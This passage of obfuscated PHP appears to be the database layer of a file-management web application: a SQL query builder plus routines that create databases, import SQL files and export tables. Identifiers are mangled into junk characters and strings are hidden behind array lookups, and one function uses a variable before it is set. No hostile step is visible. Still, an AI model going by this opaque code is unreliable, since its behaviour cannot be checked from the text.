$Á²èêÅÌ = $›šµØÄ[53] . $Á²èêÅÌ . $›šµØÄ[53]; unset($¥÷ÛŠ¦­[$›šµØÄ[1087]]); } else { $Á²èêÅÌ = $›šµØÄ[1091]; } foreach ($¥÷ÛŠ¦­ as $¹²Ç²Ê÷ => $¥Ó°ŠŸ) { $°î«×Æø .= $›šµØÄ[357]; if (is_numeric($¹²Ç²Ê÷)) { $¹²Ç²Ê÷ = $›šµØÄ[1092]; } if (0 === strpos($¹²Ç²Ê÷, $›šµØÄ[11])) { $°î«×Æø .= $this->parseThinkWhere($¹²Ç²Ê÷, $¥Ó°ŠŸ); } else { if (!preg_match($›šµØÄ[1093], trim($¹²Ç²Ê÷))) { think_exception(think_lang($›šµØÄ[1094]) . $›šµØÄ[4] . $¹²Ç²Ê÷); } $‚Ä„òÅì = is_array($¥Ó°ŠŸ) && isset($¥Ó°ŠŸ[$›šµØÄ[1095]]); $¹²Ç²Ê÷ = trim($¹²Ç²Ê÷); if (strpos($¹²Ç²Ê÷, $›šµØÄ[215])) { $Ëê®Ú†‘ = explode($›šµØÄ[215], $¹²Ç²Ê÷); $Şšõ¤â± = array(); foreach ($Ëê®Ú†‘ as $’‹şÉúñ => $òùûêå•) { $ö©€×Õ« = $‚Ä„òÅì ? $¥Ó°ŠŸ[$’‹şÉúñ] : $¥Ó°ŠŸ; $Şšõ¤â±[] = $›šµØÄ[340] . $this->parseWhereItem($this->parseKey($òùûêå•), $ö©€×Õ«) . $›šµØÄ[992]; } $°î«×Æø .= implode($›šµØÄ[1096], $Şšõ¤â±); } elseif (strpos($¹²Ç²Ê÷, $›šµØÄ[287])) { $Ëê®Ú†‘ = explode($›šµØÄ[287], $¹²Ç²Ê÷); $Şšõ¤â± = array(); foreach ($Ëê®Ú†‘ as $’‹şÉúñ => $òùûêå•) { $ö©€×Õ« = $‚Ä„òÅì ? $¥Ó°ŠŸ[$’‹şÉúñ] : $¥Ó°ŠŸ; $Şšõ¤â±[] = $›šµØÄ[340] . $this->parseWhereItem($this->parseKey($òùûêå•), $ö©€×Õ«) . $›šµØÄ[992]; } $°î«×Æø .= implode($›šµØÄ[1091], $Şšõ¤â±); } else { $°î«×Æø .= $this->parseWhereItem($this->parseKey($¹²Ç²Ê÷), $¥Ó°ŠŸ); } } $°î«×Æø .= $›šµØÄ[358] . $Á²èêÅÌ; } $°î«×Æø = substr($°î«×Æø, 0, -strlen($Á²èêÅÌ)); } return empty($°î«×Æø) ? $›šµØÄ[12] : $›šµØÄ[1097] . $°î«×Æø; } protected function parseWhereItem($¤ËóËÄ, $‰¦…‡ï) { $Ùˆªı‹• =& $_SERVER[«òÑğ]; $¢©§èî¹ = $Ùˆªı‹•[12]; if (is_array($‰¦…‡ï)) { if (is_string($‰¦…‡ï[0])) { $ÂâˆÔ§Ç = strtolower($‰¦…‡ï[0]); if (in_array($‰¦…‡ï[0], array($Ùˆªı‹•[509], $Ùˆªı‹•[1098], $Ùˆªı‹•[1099], $Ùˆªı‹•[1100], $Ùˆªı‹•[1101], $Ùˆªı‹•[1102]))) { $¢©§èî¹ .= $¤ËóËÄ . $Ùˆªı‹•[53] . $‰¦…‡ï[0] . $Ùˆªı‹•[53] . $this->parseValue($‰¦…‡ï[1]); } elseif (preg_match($Ùˆªı‹•[1103], $‰¦…‡ï[0])) { $¢©§èî¹ .= $¤ËóËÄ . $Ùˆªı‹•[53] . $this->exp[$ÂâˆÔ§Ç] . $Ùˆªı‹•[53] . $this->parseValue($‰¦…‡ï[1]); } elseif (preg_match($Ùˆªı‹•[1104], $‰¦…‡ï[0])) { if (is_array($‰¦…‡ï[1])) { $ìòäÃ…Š = isset($‰¦…‡ï[2]) ? strtoupper($‰¦…‡ï[2]) : $Ùˆªı‹•[1089]; if (in_array($ìòäÃ…Š, array($Ùˆªı‹•[1088], $Ùˆªı‹•[1089], $Ùˆªı‹•[1090]))) { $ÍĞá‡Íæ = array(); foreach ($‰¦…‡ï[1] as $´á·ñø¦) { $ÍĞá‡Íæ[] = $¤ËóËÄ . $Ùˆªı‹•[53] . $this->exp[$ÂâˆÔ§Ç] . $Ùˆªı‹•[53] . $this->parseValue($´á·ñø¦); } $¢©§èî¹ .= $Ùˆªı‹•[340] . implode($Ùˆªı‹•[53] . $ìòäÃ…Š . $Ùˆªı‹•[53], $ÍĞá‡Íæ) . $Ùˆªı‹•[992]; } } else { $¢©§èî¹ .= $¤ËóËÄ . $Ùˆªı‹•[53] . $this->exp[$ÂâˆÔ§Ç] . $Ùˆªı‹•[53] . $this->parseValue($‰¦…‡ï[1]); } } elseif ($Ùˆªı‹•[375] == $ÂâˆÔ§Ç) { $¢©§èî¹ .= $Ùˆªı‹•[990] . $¤ËóËÄ . $Ùˆªı‹•[53] . $‰¦…‡ï[1] . $Ùˆªı‹•[1105]; } elseif (preg_match($Ùˆªı‹•[1106], $‰¦…‡ï[0])) { $¢©§èî¹ .= $‰¦…‡ï[0]; } elseif (preg_match($Ùˆªı‹•[1107], $‰¦…‡ï[0])) { if (isset($‰¦…‡ï[2]) && $Ùˆªı‹•[375] == $‰¦…‡ï[2]) { $¢©§èî¹ .= $¤ËóËÄ . $Ùˆªı‹•[53] . $this->exp[$ÂâˆÔ§Ç] . $Ùˆªı‹•[53] . $‰¦…‡ï[1]; } else { if (is_string($‰¦…‡ï[1])) { $‰¦…‡ï[1] = explode($Ùˆªı‹•[50], $‰¦…‡ï[1]); } $æ˜Ã‰ = implode($Ùˆªı‹•[50], $this->parseValue($‰¦…‡ï[1])); $¢©§èî¹ .= $¤ËóËÄ . $Ùˆªı‹•[53] . $this->exp[$ÂâˆÔ§Ç] . $Ùˆªı‹•[990] . $æ˜Ã‰ . $Ùˆªı‹•[992]; } } elseif (preg_match($Ùˆªı‹•[1108], $‰¦…‡ï[0])) { $óó£§ = is_string($‰¦…‡ï[1]) ? explode($Ùˆªı‹•[50], $‰¦…‡ï[1]) : $‰¦…‡ï[1]; $¢©§èî¹ .= $Ùˆªı‹•[990] . $¤ËóËÄ . $Ùˆªı‹•[53] . $this->exp[$ÂâˆÔ§Ç] . $Ùˆªı‹•[53] . $this->parseValue($óó£§[0]) . $Ùˆªı‹•[1091] . $this->parseValue($óó£§[1]) . $Ùˆªı‹•[358]; } else { think_exception(think_lang($Ùˆªı‹•[1094]) . $Ùˆªı‹•[4] . $‰¦…‡ï[0]); } } else { $²şÏğø = count($‰¦…‡ï); $ŠÖØˆ–» = $Ùˆªı‹•[12]; if (is_string($‰¦…‡ï[$²şÏğø - 1])) { $ŠÖØˆ–» = isset($‰¦…‡ï[$²şÏğø - 1]) ? strtoupper($‰¦…‡ï[$²şÏğø - 1]) : $Ùˆªı‹•[12]; if (in_array($ŠÖØˆ–», array($Ùˆªı‹•[1088], $Ùˆªı‹•[1089], $Ùˆªı‹•[1090]))) { $²şÏğø = $²şÏğø - 1; } } else { $ŠÖØˆ–» = $Ùˆªı‹•[1088]; } for ($­°õìëí = 0; $­°õìëí < $²şÏğø; $­°õìëí++) { $óó£§ = is_array($‰¦…‡ï[$­°õìëí]) ? $‰¦…‡ï[$­°õìëí][1] : $‰¦…‡ï[$­°õìëí]; if ($Ùˆªı‹•[375] == strtolower($‰¦…‡ï[$­°õìëí][0])) { $¢©§èî¹ .= $Ùˆªı‹•[340] . $¤ËóËÄ . $Ùˆªı‹•[53] . $óó£§ . $Ùˆªı‹•[1105] . $ŠÖØˆ–» . $Ùˆªı‹•[53]; } else { $™ÈÈªöü = is_array($‰¦…‡ï[$­°õìëí]) ? $this->exp[strtolower($‰¦…‡ï[$­°õìëí][0])] : $Ùˆªı‹•[509]; if (!$™ÈÈªöü && is_array($‰¦…‡ï[$­°õìëí]) && in_array($‰¦…‡ï[$­°õìëí][0], array($Ùˆªı‹•[509], $Ùˆªı‹•[1098], $Ùˆªı‹•[1099], $Ùˆªı‹•[1100], $Ùˆªı‹•[1101], $Ùˆªı‹•[1102]))) { $™ÈÈªöü = $‰¦…‡ï[$­°õìëí][0]; } $¢©§èî¹ .= $Ùˆªı‹•[340] . $¤ËóËÄ . $Ùˆªı‹•[53] . $™ÈÈªöü . $Ùˆªı‹•[53] . $this->parseValue($óó£§) . $Ùˆªı‹•[1105] . $ŠÖØˆ–» . $Ùˆªı‹•[53]; } } $¢©§èî¹ = substr($¢©§èî¹, 0, -4); } } else { $¢©§èî¹ .= $¤ËóËÄ . $Ùˆªı‹•[1109] . $this->parseValue($‰¦…‡ï); } return $¢©§èî¹; } protected function parseThinkWhere($­˜ğ†ìô, $ò÷£—õ‡) { $‡ÍğÀ  =& $_SERVER[«òÑğ]; $Îç¼¢ğ = $‡ÍğÀ [12]; switch ($­˜ğ†ìô) { case $‡ÍğÀ [430]: $Îç¼¢ğ = $ò÷£—õ‡; break; case $‡ÍğÀ [1092]: $Îç¼¢ğ = is_string($ò÷£—õ‡) ? $ò÷£—õ‡ : substr($this->parseWhere($ò÷£—õ‡), 6); break; case $‡ÍğÀ [1110]: parse_str($ò÷£—õ‡, $¯¶‘î€—); if (isset($¯¶‘î€—[$‡ÍğÀ [1087]])) { $ ˆöøÑ = $‡ÍğÀ [53] . strtoupper($¯¶‘î€—[$‡ÍğÀ [1087]]) . $‡ÍğÀ [53]; unset($¯¶‘î€—[$‡ÍğÀ [1087]]); } else { $ ˆöøÑ = $‡ÍğÀ [1091]; } $Áõ¸ï“¸ = array(); foreach ($¯¶‘î€— as $úã–š±˜ => $ÙıÄÇ§¨) { $Áõ¸ï“¸[] = $this->parseKey($úã–š±˜) . $‡ÍğÀ [1109] . $this->parseValue($ÙıÄÇ§¨); } $Îç¼¢ğ = implode($ ˆöøÑ, $Áõ¸ï“¸); break; } return $Îç¼¢ğ; } protected function parseLimit($»ÄöÖ‚â) { $ĞÑ†œó³ =& $_SERVER[«òÑğ]; return !empty($»ÄöÖ‚â) ? $ĞÑ†œó³[51] . $»ÄöÖ‚â . $ĞÑ†œó³[53] : $ĞÑ†œó³[12]; } protected function parseJoin($·œèû¢®) { $š¶âÉÙÜ =& $_SERVER[«òÑğ]; $§Ø˜…Ğ´ = $š¶âÉÙÜ[12]; if (!empty($·œèû¢®)) { if (is_array($·œèû¢®)) { foreach ($·œèû¢® as $‰£œ¾úü => $°ßÅ¨ü£) { if (!1 !== stripos($°ßÅ¨ü£, $š¶âÉÙÜ[1111])) { $§Ø˜…Ğ´ .= $š¶âÉÙÜ[53] . $°ßÅ¨ü£; } else { $§Ø˜…Ğ´ .= $š¶âÉÙÜ[1112] . $°ßÅ¨ü£; } } } else { $§Ø˜…Ğ´ .= $š¶âÉÙÜ[1112] . $·œèû¢®; } } $§Ø˜…Ğ´ = preg_replace($š¶âÉÙÜ[1113], think_config($š¶âÉÙÜ[1017]) . $š¶âÉÙÜ[1114], $§Ø˜…Ğ´); return $§Ø˜…Ğ´; } protected function parseOrder($ÇÛèÅóé) { $õûŸì¤Ë =& $_SERVER[«òÑğ]; if (is_array($ÇÛèÅóé)) { $Üøïå¹— = array(); foreach ($ÇÛèÅóé as $²·”ìĞ => $£ˆù—ú«) { if (is_numeric($²·”ìĞ)) { $Üøïå¹—[] = $this->parseKey($£ˆù—ú«); } else { $£ˆù—ú« = in_array(strtoupper(trim($£ˆù—ú«)), array($õûŸì¤Ë[1115], $õûŸì¤Ë[1116])) ? $õûŸì¤Ë[53] . $£ˆù—ú« : $õûŸì¤Ë[12]; if (preg_match($õûŸì¤Ë[1117], $²·”ìĞ)) { $Üøïå¹—[] = $this->parseKey($²·”ìĞ) . $£ˆù—ú«; } else { think_exception($õûŸì¤Ë[1118] . $²·”ìĞ); } } } $ÇÛèÅóé = implode($õûŸì¤Ë[50], $Üøïå¹—); } return !empty($ÇÛèÅóé) ? $õûŸì¤Ë[1119] . $ÇÛèÅóé : $õûŸì¤Ë[12]; } protected function parseGroup($«£•œ) { $•’ìÑ–ù =& $_SERVER[«òÑğ]; return !empty($«£•œ) ? $•’ìÑ–ù[1120] . $«£•œ : $•’ìÑ–ù[12]; } protected function parseHaving($€Şµ¬Èé) { $³¨ĞÕ– =& $_SERVER[«òÑğ]; return !empty($€Şµ¬Èé) ? $³¨ĞÕ–[1121] . $€Şµ¬Èé : $³¨ĞÕ–[12]; } protected function parseComment($ØĞæñ²Ü) { $©é˜¥ã =& $_SERVER[«òÑğ]; return !empty($ØĞæñ²Ü) ? $©é˜¥ã[1122] . $ØĞæñ²Ü . $©é˜¥ã[1123] : $©é˜¥ã[12]; } protected function parseDistinct($ë¹‘½‰”) { $°£¼º† =& $_SERVER[«òÑğ]; return !empty($ë¹‘½‰”) ? $°£¼º†[1124] : $°£¼º†[12]; } protected function parseUnion($©í°‡ó“) { $èÛéÁÍ„ =& $_SERVER[«òÑğ]; if (empty($©í°‡ó“)) { return $èÛéÁÍ„[12]; } if (isset($©í°‡ó“[$èÛéÁÍ„[426]])) { $Şˆ›öÜâ = $èÛéÁÍ„[1125]; unset($©í°‡ó“[$èÛéÁÍ„[426]]); } else { $Şˆ›öÜâ = $èÛéÁÍ„[1126]; } foreach ($©í°‡ó“ as $šïå’Öİ) { $ÁŒ«î’ş[] = $Şˆ›öÜâ . (is_array($šïå’Öİ) ? $this->buildSelectSql($šïå’Öİ) : $šïå’Öİ); } return implode($èÛéÁÍ„[53], $ÁŒ«î’ş); } public function insert($¥¸ÃØğÙ, $±»®ªÑœ = array(), $Á´ñËŠÃ = false) { $÷—úºô˜ =& $_SERVER[«òÑğ]; $‹¢Æ“ì = $åş­öóç = array(); $this->model = $±»®ªÑœ[$÷—úºô˜[361]]; foreach ($¥¸ÃØğÙ as $§©¹öÄ€ => $¼¿Òî¯Ó) { if (is_array($¼¿Òî¯Ó) && $÷—úºô˜[375] == $¼¿Òî¯Ó[0]) { $åş­öóç[] = $this->parseKey($§©¹öÄ€); $‹¢Æ“ì[] = $¼¿Òî¯Ó[1]; } elseif (is_scalar($¼¿Òî¯Ó) || is_null($¼¿Òî¯Ó)) { $åş­öóç[] = $this->parseKey($§©¹öÄ€); $‹¢Æ“ì[] = $this->parseValue($¼¿Òî¯Ó); } } $™Ô³µÈ = ($Á´ñËŠÃ ? $÷—úºô˜[994] : $÷—úºô˜[995]) . $÷—úºô˜[996] . $this->parseTable($±»®ªÑœ[$÷—úºô˜[359]]) . $÷—úºô˜[990] . implode($÷—úºô˜[50], $åş­öóç) . $÷—úºô˜[991] . implode($÷—úºô˜[50], $‹¢Æ“ì) . $÷—úºô˜[992]; $™Ô³µÈ .= $this->parseLock(isset($±»®ªÑœ[$÷—úºô˜[933]]) ? $±»®ªÑœ[$÷—úºô˜[933]] : !1); $™Ô³µÈ .= $this->parseComment(!empty($±»®ªÑœ[$÷—úºô˜[432]]) ? $±»®ªÑœ[$÷—úºô˜[432]] : $÷—úºô˜[12]); return $this->execute($™Ô³µÈ, $this->parseBind(!empty($±»®ªÑœ[$÷—úºô˜[363]]) ? $±»®ªÑœ[$÷—úºô˜[363]] : array())); } public function selectInsert($¬±“æÔä, $¼ø·”ÃÄ, $Ñ’Ë Üƒ = array()) { $ º¢ÕÛ• =& $_SERVER[«òÑğ]; $this->model = $Ñ’Ë Üƒ[$ º¢ÕÛ•[361]]; if (is_string($¬±“æÔä)) { $¬±“æÔä = explode($ º¢ÕÛ•[50], $¬±“æÔä); } array_walk($¬±“æÔä, array($this, $ º¢ÕÛ•[993])); $„©Ö»— = $ º¢ÕÛ•[1127] . $this->parseTable($¼ø·”ÃÄ) . $ º¢ÕÛ•[990] . implode($ º¢ÕÛ•[50], $¬±“æÔä) . $ º¢ÕÛ•[1105]; $„©Ö»— .= $this->buildSelectSql($Ñ’Ë Üƒ); return $this->execute($„©Ö»—, $this->parseBind(!empty($Ñ’Ë Üƒ[$ º¢ÕÛ•[363]]) ? $Ñ’Ë Üƒ[$ º¢ÕÛ•[363]] : array())); } public function update($ŠÇõÃ€, $ä¯È÷Ù™) { $•Œ•Å…· =& $_SERVER[«òÑğ]; $this->model = $ä¯È÷Ù™[$•Œ•Å…·[361]]; $·ëš©œš = $•Œ•Å…·[1128] . $this->parseTable($ä¯È÷Ù™[$•Œ•Å…·[359]]) . $this->parseSet($ŠÇõÃ€) . $this->parseWhere(!empty($ä¯È÷Ù™[$•Œ•Å…·[355]]) ? $ä¯È÷Ù™[$•Œ•Å…·[355]] : $•Œ•Å…·[12]) . $this->parseOrder(!empty($ä¯È÷Ù™[$•Œ•Å…·[444]]) ? $ä¯È÷Ù™[$•Œ•Å…·[444]] : $•Œ•Å…·[12]) . $this->parseLimit(!empty($ä¯È÷Ù™[$•Œ•Å…·[370]]) ? $ä¯È÷Ù™[$•Œ•Å…·[370]] : $•Œ•Å…·[12]) . $this->parseLock(isset($ä¯È÷Ù™[$•Œ•Å…·[933]]) ? $ä¯È÷Ù™[$•Œ•Å…·[933]] : !1) . $this->parseComment(!empty($ä¯È÷Ù™[$•Œ•Å…·[432]]) ? $ä¯È÷Ù™[$•Œ•Å…·[432]] : $•Œ•Å…·[12]); return $this->execute($·ëš©œš, $this->parseBind(!empty($ä¯È÷Ù™[$•Œ•Å…·[363]]) ? $ä¯È÷Ù™[$•Œ•Å…·[363]] : array())); } public function delete($ã”µÁç­ = array()) { $ˆ§œ’¾ =& $_SERVER[«òÑğ]; $this->model = $ã”µÁç­[$ˆ§œ’¾[361]]; $şò·±ñê = $ˆ§œ’¾[1129] . $this->parseTable($ã”µÁç­[$ˆ§œ’¾[359]]) . $this->parseWhere(!empty($ã”µÁç­[$ˆ§œ’¾[355]]) ? $ã”µÁç­[$ˆ§œ’¾[355]] : $ˆ§œ’¾[12]) . $this->parseOrder(!empty($ã”µÁç­[$ˆ§œ’¾[444]]) ? $ã”µÁç­[$ˆ§œ’¾[444]] : $ˆ§œ’¾[12]) . $this->parseLimit(!empty($ã”µÁç­[$ˆ§œ’¾[370]]) ? $ã”µÁç­[$ˆ§œ’¾[370]] : $ˆ§œ’¾[12]) . $this->parseLock(isset($ã”µÁç­[$ˆ§œ’¾[933]]) ? $ã”µÁç­[$ˆ§œ’¾[933]] : !1) . $this->parseComment(!empty($ã”µÁç­[$ˆ§œ’¾[432]]) ? $ã”µÁç­[$ˆ§œ’¾[432]] : $ˆ§œ’¾[12]); return $this->execute($şò·±ñê, $this->parseBind(!empty($ã”µÁç­[$ˆ§œ’¾[363]]) ? $ã”µÁç­[$ˆ§œ’¾[363]] : array())); } public function select($ˆòÀ‰û˜ = array()) { $ì”ä‡Í =& $_SERVER[«òÑğ]; $this->model = $ˆòÀ‰û˜[$ì”ä‡Í[361]]; $ëû‹ÛÉá = $this->buildSelectSql($ˆòÀ‰û˜); $ı¼Í†ßâ = isset($ˆòÀ‰û˜[$ì”ä‡Í[427]]) ? $ˆòÀ‰û˜[$ì”ä‡Í[427]] : !1; if ($ı¼Í†ßâ) { $øØ»‰ÍÂ = is_string($ı¼Í†ßâ[$ì”ä‡Í[97]]) ? $ı¼Í†ßâ[$ì”ä‡Í[97]] : $ì”ä‡Í[1130] . md5($ëû‹ÛÉá); $Ñê­Äî§ = think_cache($øØ»‰ÍÂ, $ì”ä‡Í[12], $ı¼Í†ßâ); if (!1 !== $Ñê­Äî§) { return $Ñê­Äî§; } } $·Ú¾óä« = $this->query($ëû‹ÛÉá, $this->parseBind(!empty($ˆòÀ‰û˜[$ì”ä‡Í[363]]) ? $ˆòÀ‰û˜[$ì”ä‡Í[363]] : array())); if ($ı¼Í†ßâ && !1 !== $·Ú¾óä«) { think_cache($øØ»‰ÍÂ, $·Ú¾óä«, $ı¼Í†ßâ); } return $·Ú¾óä«; } public function buildSelectSql($»§±¸€ = array()) { $ÌêÙâ–ü =& $_SERVER[«òÑğ]; if (isset($»§±¸€[$ÌêÙâ–ü[431]])) { if (strpos($»§±¸€[$ÌêÙâ–ü[431]], $ÌêÙâ–ü[50])) { list($¸Œ·Öî¡, $éá×˜Ş©) = explode($ÌêÙâ–ü[50], $»§±¸€[$ÌêÙâ–ü[431]]); } else { $¸Œ·Öî¡ = $»§±¸€[$ÌêÙâ–ü[431]]; } $¸Œ·Öî¡ = $¸Œ·Öî¡ ? $¸Œ·Öî¡ : 1; $éá×˜Ş© = isset($éá×˜Ş©) ? $éá×˜Ş© : (is_numeric($»§±¸€[$ÌêÙâ–ü[370]]) ? $»§±¸€[$ÌêÙâ–ü[370]] : 20); $˜¤ıÆî± = $éá×˜Ş© * ((int) $¸Œ·Öî¡ - 1); $»§±¸€[$ÌêÙâ–ü[370]] = $˜¤ıÆî± . $ÌêÙâ–ü[50] . $éá×˜Ş©; } if (think_config($ÌêÙâ–ü[1131])) { $Ã€ı´Ø¥ = $ÌêÙâ–ü[1132] . md5(serialize($»§±¸€)); $”¢¦Şš­ = think_cache($Ã€ı´Ø¥); if ($”¢¦Şš­) { return $”¢¦Şš­; } } $„¤Öô’è = $this->parseSql($this->selectSql, $»§±¸€); $„¤Öô’è .= $this->parseLock(isset($»§±¸€[$ÌêÙâ–ü[933]]) ? $»§±¸€[$ÌêÙâ–ü[933]] : !1); if (isset($Ã€ı´Ø¥)) { think_cache($Ã€ı´Ø¥, $„¤Öô’è); } return $„¤Öô’è; } public function parseSql($õÕ‚ëô’, $ì»îÁËô = array()) { $ÄÁó• =& $_SERVER[«òÑğ]; $õÕ‚ëô’ = str_replace(array($ÄÁó•[1133], $ÄÁó•[1134], $ÄÁó•[1135], $ÄÁó•[1136], $ÄÁó•[1137], $ÄÁó•[1138], $ÄÁó•[1139], $ÄÁó•[1140], $ÄÁó•[1141], $ÄÁó•[1142], $ÄÁó•[1143]), array($this->parseTable("{$ì»îÁËô[$ÄÁó•[359]]}"), $this->parseDistinct(isset($ì»îÁËô[$ÄÁó•[1144]]) ? $ì»îÁËô[$ÄÁó•[1144]] : !1), $this->parseField(!empty($ì»îÁËô[$ÄÁó•[353]]) ? $ì»îÁËô[$ÄÁó•[353]] : $ÄÁó•[223]), $this->parseJoin(!empty($ì»îÁËô[$ÄÁó•[362]]) ? $ì»îÁËô[$ÄÁó•[362]] : $ÄÁó•[12]), $this->parseWhere(!empty($ì»îÁËô[$ÄÁó•[355]]) ? $ì»îÁËô[$ÄÁó•[355]] : $ÄÁó•[12]), $this->parseGroup(!empty($ì»îÁËô[$ÄÁó•[583]]) ? $ì»îÁËô[$ÄÁó•[583]] : $ÄÁó•[12]), $this->parseHaving(!empty($ì»îÁËô[$ÄÁó•[1145]]) ? $ì»îÁËô[$ÄÁó•[1145]] : $ÄÁó•[12]), $this->parseOrder(!empty($ì»îÁËô[$ÄÁó•[444]]) ? $ì»îÁËô[$ÄÁó•[444]] : $ÄÁó•[12]), $this->parseLimit(!empty($ì»îÁËô[$ÄÁó•[370]]) ? $ì»îÁËô[$ÄÁó•[370]] : $ÄÁó•[12]), $this->parseUnion(!empty($ì»îÁËô[$ÄÁó•[425]]) ? $ì»îÁËô[$ÄÁó•[425]] : $ÄÁó•[12]), $this->parseComment(!empty($ì»îÁËô[$ÄÁó•[432]]) ? $ì»îÁËô[$ÄÁó•[432]] : $ÄÁó•[12])), $õÕ‚ëô’); return $õÕ‚ëô’; } public function getLastSql($ÌÍôôõ² = '') { return $ÌÍôôõ² ? $this->modelSql[$ÌÍôôõ²] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¼“ˆÖĞ«) { return addslashes($¼“ˆÖĞ«); } public function setModel($„¦•¯«) { $this->model = $„¦•¯«; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($‹ŸØŸ¡‰ = array()) { $·ûê¹İÈ =& $_SERVER[«òÑğ]; if (empty($‹ŸØŸ¡‰)) { $‹ŸØŸ¡‰ = $GLOBALS[$·ûê¹İÈ[6]][$·ûê¹İÈ[21]]; } $this->database = $‹ŸØŸ¡‰; } public function model($³ç´Šƒö = '') { return new ModelBase($³ç´Šƒö, $_SERVER[«òÑğ][12], $this->database); } public function db($òÀ—ÉÃŞ = false) { $ïÌŠ =& $_SERVER[«òÑğ]; $âÀƒÕ±Œ = array_change_key_case($this->database); if ($this->dbType() == $ïÌŠ[13] || !$òÀ—ÉÃŞ) { return $this->model()->db(); } $Ê¨‹ğ…€ = $âÀƒÕ±Œ[$ïÌŠ[1059]]; $âÀƒÕ±Œ[$ïÌŠ[1059]] = $ïÌŠ[12]; if ($âÀƒÕ±Œ[$ïÌŠ[1054]] == $ïÌŠ[1051]) { $ú¹Æè˜ã = $âÀƒÕ±Œ[$ïÌŠ[1060]]; $âÀƒÕ±Œ[$ïÌŠ[1060]] = substr($ú¹Æè˜ã, 0, strrpos($ú¹Æè˜ã, $ïÌŠ[1146])); } $this->database = $âÀƒÕ±Œ; $ñÕ‡ßÈš = $this->model()->db(); try { $¬¹Ì™õ« = $ñÕ‡ßÈš->execute("\163\x68\157\167\x20\x64\141\x74\141\142\141\163\x65\163\40\x6c\x69\153\x65\x20\x27{$Ê¨‹ğ…€}\x27"); } catch (Exception $ñ÷È±ûØ) { } if (!$¬¹Ì™õ«) { $ñÕ‡ßÈš->execute("\x63\x72\x65\141\164\x65\40\x64\x61\x74\x61\x62\x61\x73\x65\40\x60{$Ê¨‹ğ…€}\x60"); } $âÀƒÕ±Œ[$ïÌŠ[1059]] = $Ê¨‹ğ…€; if ($âÀƒÕ±Œ[$ïÌŠ[1054]] == $ïÌŠ[1051]) { $âÀƒÕ±Œ[$ïÌŠ[1060]] .= $ïÌŠ[1146] . $Ê¨‹ğ…€; } $this->database = $âÀƒÕ±Œ; $ñÕ‡ßÈš->execute("\165\x73\145\x20\x60{$Ê¨‹ğ…€}\x60"); return $ñÕ‡ßÈš; } public function createTable($Ã™¡ŸØù, &$”ÄÏ´ºë) { $ßŒ“‚Šƒ =& $_SERVER[«òÑğ]; if (!IO::exist($Ã™¡ŸØù)) { ActionCall($ßŒ“‚Šƒ[1147], !0, 0); show_json(LNG($ßŒ“‚Šƒ[1148]), !1); } $ÆÜÈÓè¸ = $this->model()->db(); $æ–œï¬… = sqlSplit(IO::getContent($Ã™¡ŸØù)); foreach ($æ–œï¬… as $Á…áœî) { $©ò¿Úİ = stripos($Á…áœî, $ßŒ“‚Šƒ[1149]) === 0; if ($©ò¿Úİ) { $”ÄÏ´ºë->task[$ßŒ“‚Šƒ[1150]] += 1; } $ÆÜÈÓè¸->execute($Á…áœî); if ($©ò¿Úİ) { preg_match($ßŒ“‚Šƒ[1151], $Á…áœî, $¸£¾Á²ô); $”ÄÏ´ºë->task[$ßŒ“‚Šƒ[1152]] = $¸£¾Á²ô[1]; $”ÄÏ´ºë->update(1); } } } public function insertTable($ëÄä¬—, &$ÌÌ½Ÿ‘³) { $®®¥»¼ =& $_SERVER[«òÑğ]; $ÓíÏ•© = $this->model()->db(); $ÄŒê–ğù = $°åÒ½š ? array($°åÒ½š) : $ÓíÏ•©->getTables(); foreach ($ëÄä¬— as $ûì¤ĞÖ†) { $°åÒ½š = basename($ûì¤ĞÖ†, $®®¥»¼[874]); if (!in_array($°åÒ½š, $ÄŒê–ğù)) { continue; } $ÌÌ½Ÿ‘³->task[$®®¥»¼[1152]] = $°åÒ½š; if (get_filesize($ûì¤ĞÖ†) == 0) { continue; } $£ÆÏ¬Ù× = $this->sqlToDb($ûì¤ĞÖ†, $ÌÌ½Ÿ‘³); if (!$£ÆÏ¬Ù×) { ActionCall($®®¥»¼[1147], !0, 0); show_json(LNG($®®¥»¼[1153]) . "\x5b{$°åÒ½š}\135", !1); } } } public function sqlFromDb($öÌòÖÄ—, $ô¼é²Û, &$×ë¢ÈÅü, $ÒŸš…Ìä = '') { if ($×ë¢ÈÅü) { $×ë¢ÈÅü->task[$_SERVER[«òÑğ][1152]] = $öÌòÖÄ—; } $°Ğò”ç• = $this->model($öÌòÖÄ—); $˜‚ôŸÁû = 0; $ùåÑ×õà = 0; $ìûı¬Í— = 10000; $ïèõŠ‚Ã = fopen($ô¼é²Û, $_SERVER[«òÑğ][1154]); $æÍÆƒû‡ = $°Ğò”ç•->getPk(); $•½‰¸æé = $°Ğò”ç•->getDbFields(); $ŠµÖü‰² = $_SERVER[«òÑğ][12]; if ($GLOBALS[$_SERVER[«òÑğ][873]] && in_array($öÌòÖÄ—, array($_SERVER[«òÑğ][1155], $_SERVER[«òÑğ][1156]))) { $ŠµÖü‰² = $öÌòÖÄ—; } do { $Ÿ¥ª½®Ş = array($æÍÆƒû‡ => array($_SERVER[«òÑğ][1101], $ùåÑ×õà)); $’µÌØÈœ = $°Ğò”ç•->where($Ÿ¥ª½®Ş)->field($•½‰¸æé)->order($æÍÆƒû‡ . $_SERVER[«òÑğ][1157])->limit($ìûı¬Í—)->select(); $’µÌØÈœ = !empty($’µÌØÈœ) ? $’µÌØÈœ : array(); if (!($€·áá»­ = count($’µÌØÈœ))) { break; } $»ËÒÂª» = end($’µÌØÈœ); $ùåÑ×õà = $»ËÒÂª»[$æÍÆƒû‡]; $¢ğŒ°¢ë = array(); foreach ($’µÌØÈœ as $´°¥Ò‡È) { if ($ŠµÖü‰²) { if ($öÌòÖÄ— == $_SERVER[«òÑğ][1155]) { if ($´°¥Ò‡È[$_SERVER[«òÑğ][33]] == $_SERVER[«òÑğ][1158]) { $Ş­·¦¬è = json_decode($´°¥Ò‡È[$_SERVER[«òÑğ][453]], !0); if ($Ş­·¦¬è[$_SERVER[«òÑğ][32]] == $GLOBALS[$_SERVER[«òÑğ][873]] && $Ş­·¦¬è[$_SERVER[«òÑğ][834]] != 1) { continue; } } } else { if ($´°¥Ò‡È[$_SERVER[«òÑğ][33]] == $_SERVER[«òÑğ][1159] && $´°¥Ò‡È[$_SERVER[«òÑğ][97]] == $_SERVER[«òÑğ][869]) { continue; } } } if ($ÒŸš…Ìä) { 